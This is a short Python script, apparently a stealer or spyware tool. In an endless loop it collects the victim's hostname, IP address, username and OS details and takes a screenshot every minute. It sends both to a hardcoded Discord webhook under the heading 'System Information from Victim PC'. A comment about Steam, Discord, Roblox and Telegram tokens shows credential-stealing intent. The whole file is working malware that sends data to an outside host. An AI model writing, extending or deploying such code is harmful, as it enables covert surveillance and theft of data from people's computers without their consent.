import os
import platform
import socket
import time
import requests
from PIL import Image
import io
import datetime
from base64 import b64encode

def get_system_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        username = os.getlogin()
        os_name = platform.system()
        os_version = platform.version()
        return {
            "hostname": hostname,
            "ip_address": ip_address,
            "username": username,
            "os_name": os_name,
            "os_version": os_version,
            "note": "Tokens for Steam, Discord, Roblox, and Telegram cannot be accessed without user authentication or stored credentials."
        }
    except Exception as e:
        return {"error": f"Failed to collect system info: {str(e)}"}

def take_screenshot():
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        return buffer.getvalue()
    except Exception as e:
        return None, f"Failed to take screenshot: {str(e)}"

def send_to_webhook(data, screenshot=None):
    webhook_url = "https://discord.com/api/webhooks/1394677813579350068/E4YNqaYjcuiGMfM16KxH8MVHPp6Kh9zc76CgZo6e6rfUM_PA2oDhDNa5Z_RdvQhiF2sy"
    payload = {
        "content": "System Information from Victim PC",
        "embeds": [{
            "title": "System Info",
            "color": 16711680,
            "description": "\n".join(f"{key}: {value}" for key, value in data.items()),
            "timestamp": datetime.datetime.utcnow().isoformat()
        }]
    }
    files = {}
    if screenshot:
        files["file[0]"] = ("screenshot.png", screenshot, "image/png")
    
    try:
        response = requests.post(webhook_url, json=payload, files=files if screenshot else None)
        return response.status_code == 204 or response.status_code == 200
    except Exception as e:
        return f"Failed to send to webhook: {str(e)}"

def main():
    while True:
        info = get_system_info()
        screenshot = take_screenshot()
        send_to_webhook(info, screenshot)
        time.sleep(60)  # Send data every 60 seconds

if __name__ == "__main__":
    main()